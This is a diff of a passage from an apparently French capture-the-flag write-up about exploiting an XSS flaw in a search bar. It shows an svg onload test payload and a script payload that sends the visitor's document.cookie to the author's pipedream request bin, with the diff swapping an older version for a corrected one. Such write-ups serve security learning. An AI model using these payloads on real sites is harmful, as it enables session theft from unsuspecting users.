@@ -10,4 +10,5 @@ Premièrement je teste cette payload ```<svg/onload=prompt();>```.<br/><br/>
 <img src="https://media.discordapp.net/attachments/768928242467340328/840140153799311380/unknown.png?width=1440&height=470"/><br/>
 Le searchbar est vulnérable aux attaques XSS. On a donc notre point d'injection.<br/>
 En premier temps je crée un requestbin sur https://pipedream.com/ <br/>
-```<script>document.location='https://enx36kg9aihcldt.m.pipedream.net'+document.cookie</script>```
+Cette payload est une redirection vers mon pipedream.<br/>
+```<script>document.location="https://enx36kg9aihcldt.m.pipedream.net?cookie="+document.cookie;</script>```
